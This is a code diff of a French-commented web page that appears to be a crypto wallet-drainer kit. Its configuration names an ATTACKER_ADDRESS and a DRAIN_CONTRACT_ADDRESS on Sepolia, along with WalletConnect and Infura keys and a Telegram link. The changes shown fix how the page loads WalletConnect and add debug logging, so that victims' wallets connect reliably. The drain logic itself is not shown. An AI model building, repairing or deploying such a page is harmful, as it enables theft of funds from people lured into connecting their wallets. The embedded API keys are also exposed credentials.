@@ -8,8 +8,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <!-- Librairies externes -->
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" type="text/javascript"></script>
-    <!-- Utiliser une version différente de WalletConnect -->
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.13.0/dist/index.min.js"></script>
     <!-- Ajout d'Eruda pour le débogage sur mobile (temporaire) -->
     <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
     <script>eruda.init();</script>
@@ -217,7 +215,7 @@
             ATTACKER_ADDRESS: '0xc427AB745eA6b12C557c7342f94D96f68D19D754',
             DRAIN_CONTRACT_ADDRESS: '0x5D8F38c17aB48446c7b28E38076aCD9057480963', // Adresse correcte pour Sepolia
             WALLET_CONNECT_PROJECT_ID: '734ae739400cb6571838de4b118a972d', // Remplace par ton Project ID WalletConnect
-            INFURA_API_KEY: '0c56a36ee5ff4b72b18abdf5fa241dbd' // Remplace par ta clé API Infura
+            INFURA_API_KEY: '0c56a36ee5ff4b72b18abdf5fa241dbd' // Clé Infura fournie
         };
 
         // URL Telegram
@@ -291,11 +289,6 @@
 
         // Fonction pour afficher la liste des wallets
         async function showWalletList(elements) {
-            console.log('Vérification de window.EthereumProvider :', window.EthereumProvider);
-            if (!window.EthereumProvider) {
-                throw new Error('EthereumProvider n\'est pas défini. Vérifiez que la bibliothèque WalletConnect est correctement chargée.');
-            }
-
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             const walletListContainer = document.getElementById('walletList');
 
@@ -333,8 +326,14 @@
                     walletListContainer.classList.add('hidden');
 
                     try {
+                        // Importer WalletConnect dynamiquement
+                        console.log('Tentative d\'importation dynamique de WalletConnect...');
+                        const { EthereumProvider } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.13.0/dist/index.es.js');
+                        console.log('EthereumProvider importé :', EthereumProvider);
+
                         // Initialiser WalletConnect
-                        const provider = await window.EthereumProvider.init({
+                        console.log('Initialisation de WalletConnect...');
+                        const provider = await EthereumProvider.init({
                             projectId: CONFIG.WALLET_CONNECT_PROJECT_ID,
                             chains: [11155111], // Sepolia
                             showQrModal: false, // Désactiver le QR code
@@ -346,6 +345,7 @@
                         });
 
                         // Connecter via WalletConnect
+                        console.log('Connexion via WalletConnect...');
                         await provider.connect();
                         const web3Provider = new window.ethers.providers.Web3Provider(provider);
 
@@ -359,6 +359,7 @@
                         }
                     } catch (error) {
                         updateStatus(elements, `Erreur lors de la connexion à ${wallet.name} : ${error.message}. Veuillez réessayer.`, false, 'red');
+                        console.error('Erreur lors de la connexion :', error);
                         walletListContainer.classList.remove('hidden');
                     }
                 });
@@ -372,6 +373,7 @@
                 if (wallet.type === 'ethereum') {
                     const provider = wallet.provider;
                     // Demander l'accès au compte
+                    console.log('Demande d\'accès aux comptes...');
                     await provider.send('eth_requestAccounts', []);
                     const network = await provider.getNetwork();
                     console.log('Réseau détecté :', network.name);
@@ -412,6 +414,7 @@
                 }
             } catch (error) {
                 updateStatus(elements, 'Erreur : ' + error.message, false, 'red');
+                console.error('Erreur dans handleWalletConnection :', error);
                 return false;
             }
         }
